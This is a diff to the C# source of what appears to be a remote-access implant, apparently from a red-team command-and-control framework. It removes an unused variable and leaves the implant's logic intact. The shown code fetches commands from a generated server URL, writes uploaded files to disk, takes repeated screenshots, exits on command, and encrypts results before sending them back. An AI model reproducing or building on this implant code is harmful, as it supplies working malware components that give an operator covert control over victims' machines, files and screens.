@@ -359,7 +359,7 @@ public class Program
 			output.Length = 0;
 			try
 			{
-				String x = "", tasksrc = "", cmd = null;
+				String x = "", cmd = null;
 				try
 				{
 					cmd = GetWebRequest(null).DownloadString(UrlGen.GenerateUrl());
@@ -378,7 +378,6 @@ public class Program
 					{
 						var taskId = c.Substring(0, 5);
 						cmd = c.Substring(5, c.Length - 5);
-						tasksrc = cmd;
 						if (cmd.ToLower().StartsWith("exit"))
 						{
 							exitvt.Set();
@@ -396,7 +395,6 @@ public class Program
 							Console.WriteLine("Uploaded file to: " + splitargs[1]);
 							var fileBytes = Convert.FromBase64String(splitargs[0]);
 							System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
-							tasksrc = "Uploaded file sucessfully";
 						}
 						else if (cmd.ToLower().StartsWith("download-file"))
 						{
@@ -426,7 +424,6 @@ public class Program
 								sShotCount++;
 								if (sShotCount > 100) {
 									sShot = false;
-									tasksrc = "Finished Multi";
 									var sbc = strOutput.GetStringBuilder();
 									sbc.Remove(0, sbc.Length);
 									output.Append("[+] Multi Screenshot Ran Sucessfully");
@@ -484,8 +481,6 @@ public class Program
 						output.AppendLine(strOutput.ToString());
 						var sb = strOutput.GetStringBuilder();
 						sb.Remove(0, sb.Length);
-						if (tasksrc.Length > 200) // This is not used?
-							tasksrc = tasksrc.Substring(0, 199);
 						var enTaskId = Encryption(Key, taskId);
 						var coutput = Encryption(Key, output.ToString(), true);
 						var outputBytes = System.Convert.FromBase64String(coutput);
